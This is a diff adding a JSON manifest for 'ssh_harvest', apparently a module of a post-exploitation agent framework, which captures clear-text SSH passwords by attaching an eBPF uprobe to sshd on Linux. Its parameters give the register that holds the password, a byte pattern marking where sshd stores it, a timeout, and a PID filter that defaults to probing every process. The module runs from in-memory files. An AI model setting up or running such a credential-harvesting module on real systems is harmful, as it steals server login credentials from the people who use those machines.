@@ -1,0 +1,54 @@
+{
+  "name": "ssh_harvest",
+  "build": "sh build.sh",
+  "author": "jm33-ng",
+  "date": "2026-10-04",
+  "comment": "Capture clear-text SSH credentials with an eBPF uprobe on the sshd authentication path (no ptrace, no breakpoints)",
+  "is_local": false,
+  "platform": "Linux",
+  "module_files_memfs": true,
+  "parameters": [
+    {
+      "name": "reg-name",
+      "description": "Register that holds the password at the probe point (x86_64: RAX, RDI, RSI, RDX, RCX, R8, R9, RBP, RSP, RBX, R12-R15)",
+      "default": "RSI",
+      "type": "cstr",
+      "required": false
+    },
+    {
+      "name": "code-pattern",
+      "description": "Hex byte pattern marking where sshd stores the password; empty uses the built-in default",
+      "default": "4883c4080fb6c021",
+      "type": "cstr",
+      "required": false
+    },
+    {
+      "name": "timeout",
+      "description": "Seconds to keep the uprobe attached and collect credentials",
+      "default": "10",
+      "type": "int",
+      "required": false
+    },
+    {
+      "name": "path",
+      "description": "sshd binary to probe (empty uses /usr/sbin/sshd)",
+      "default": "/usr/sbin/sshd",
+      "type": "cstr",
+      "required": false
+    },
+    {
+      "name": "pid",
+      "description": "Attach only to this PID (-1 probes every process mapping the binary)",
+      "default": "-1",
+      "type": "int",
+      "required": false
+    }
+  ],
+  "agent_config": {
+    "exec": "ssh_harvest.star",
+    "files": ["ssh_harvest.star", "probe.bpf.o"],
+    "type": "starlark"
+  },
+  "invocation": {},
+  "dependencies": ["libbpf"]
+}
